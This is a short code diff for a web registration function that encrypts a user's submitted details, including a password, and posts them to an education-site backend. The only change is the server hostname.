@@ -291,7 +291,7 @@ function cont (){
   var data = JSON.stringify({fn:fn,ln:ln,gn:gn,bd:bd,em:em,pn:pn,ad:ad,st:st,yr:yr,wa:wa,pw:pw});
   et = CryptoJS.AES.encrypt(data, keyid).toString();
   var xhr2 = new XMLHttpRequest();
-  var url2 ="https://server-01.lankaedu.tk/reg";
+  var url2 ="https://server-02.lankaedu.tk/reg";
   xhr2.open("POST", url2, true);
   xhr2.setRequestHeader("Content-Type", "application/json");
   
